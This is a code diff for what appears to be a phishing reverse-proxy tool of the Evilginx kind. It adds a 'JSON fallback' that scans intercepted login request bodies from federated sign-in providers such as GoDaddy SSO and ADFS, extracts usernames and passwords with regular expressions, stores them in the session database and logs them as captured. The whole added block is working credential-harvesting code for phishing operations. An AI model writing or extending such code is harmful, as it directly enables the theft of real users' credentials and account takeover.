@@ -731,6 +731,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
+							// JSON fallback: for federated providers (GoDaddy SSO, ADFS, etc.)
+							// that send JSON credentials but use form-POST phishlet config,
+							// scan the body for common credential field names and promote
+							// them into the real username/password session fields.
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								jsonUserRe := regexp.MustCompile(`"(?:username|email|login|user)"\s*:\s*"([^"]{3,})"`)
+								jsonPassRe := regexp.MustCompile(`"(?:password|passwd|pass|pwd|secret)"\s*:\s*"([^"]{1,})"`)
+								if s.Username == "" {
+									if um := jsonUserRe.FindStringSubmatch(string(body)); um != nil && len(um) > 1 {
+										p.setSessionUsername(ps.SessionId, um[1])
+										log.Success("[%d] Username (federated): [%s]", ps.Index, um[1])
+										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+								}
+								if s.Password == "" {
+									if pm := jsonPassRe.FindStringSubmatch(string(body)); pm != nil && len(pm) > 1 {
+										p.setSessionPassword(ps.SessionId, pm[1])
+										log.Success("[%d] Password (federated): [%s]", ps.Index, pm[1])
+										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+								}
+							}
+
 							// force post json
 							for _, fp := range pl.forcePost {
 								if fp.path.MatchString(req.URL.Path) {
